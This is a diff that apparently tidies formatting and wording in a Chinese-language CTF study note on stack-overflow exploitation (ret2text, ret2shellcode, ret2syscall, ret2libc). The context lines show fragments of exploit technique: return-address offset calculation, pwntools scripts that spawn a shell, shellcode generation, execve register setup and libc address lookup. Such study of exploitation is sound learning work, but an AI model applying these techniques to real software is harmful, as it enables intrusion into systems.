@@ -11,7 +11,7 @@ ctfwiki是一个很好的学习网站：https://ctf-wiki.github.io/
 ## ret2text
 有栈溢出，但栈不可执行  
 有 shell 调用：  
-```
+```r
 .text:0804863A mov     dword ptr [esp], offset command ; "/bin/sh"
 .text:08048641 call    _system         ; Call Pro
 ```
@@ -19,17 +19,18 @@ ctfwiki是一个很好的学习网站：https://ctf-wiki.github.io/
 所以用 ROP，这里其实就是把 main 的返回地址改成 0804863A  
 
 需要找到输入点到返回地址的偏移：  
-```
+```r
 # 返回地址的位置
 FFFFD2EC  F7DECE81  libc_2.27.so:__libc_start_main+F1
 # 输入点的位置
 FFFFD27C
 ```
+
 偏移 0x70，然后就是脚本了  
 ```python
 # coding:utf8
 
-from pwn import  *
+from pwn import *
 
 conn = process('./ret2text')
 
@@ -52,7 +53,7 @@ FFFFD2DC  F7DECE81  libc_2.27.so:__libc_start_main+F1
 FFFFD26C
 '''
 
-from pwn import  *
+from pwn import *
 
 shellcode = asm(shellcraft.sh())
 print(len(shellcode))
@@ -78,7 +79,7 @@ execve("/bin/sh",NULL,NULL)
 其中，该程序是 32 位，所以我们需要使得
 
 系统调用号，即 eax 应该为 0xb
-第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
+第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实指向 sh 的地址也可以
 第二个参数，即 ecx 应该为 0
 第三个参数，即 edx 应该为 0
 ```
@@ -99,7 +100,7 @@ execve("/bin/sh",NULL,NULL)
 0xffffd25c --> 0x3
 '''
 
-from pwn import  *
+from pwn import *
 
 
 pop_eax_ret_addr = 0x080bb196
@@ -121,7 +122,7 @@ conn.interactive()
 ## ret2libc
 
 ### 例1
-这个的特征是：gets函数有栈溢出，程序里的secure函数调用了system，然后程序里可以搜到'/bin/sh'字符串。  
+这个例子的特征是：gets函数有栈溢出，程序里的secure函数调用了system，程序里可以搜到'/bin/sh'字符串。  
 所以思路就是设置system函数的参数为'/bin/sh'，跳到执行system函数的地方，就能拿到shell了。  
 先看一个错误的脚本：  
 ```python
@@ -225,7 +226,7 @@ if __name__ == "__main__":
 ```
 
 ### 例2
-和上面的类似，只是这次没了`/bin/sh`字符串，所以需要自己构造ROP读入这样的字符串，自己没想出来，这是网站上的脚本：  
+和上面的例子类似，只是这次没了`/bin/sh`字符串，所以需要自己构造ROP读入这样的字符串，自己没想出来，这是网站上的脚本：  
 ```python
 from pwn import *
 
@@ -356,7 +357,7 @@ sh.interactive()
 利用的大概流程就是先找一个远程机器已经执行过的函数地址，和本地libc的函数地址对比，得到偏移，继而推出其他函数在远程机器的地址，这样就能调用远程机器的函数了  
 
 一开始用LibcSearcher找不到对应的libc，用这样的方法把本机的32位libc加到库里：  
-```
+```bash
 cd ~/LibcSearcher/libc-database/
 ./add /lib/i386-linux-gnu/libc.so.6
 ```
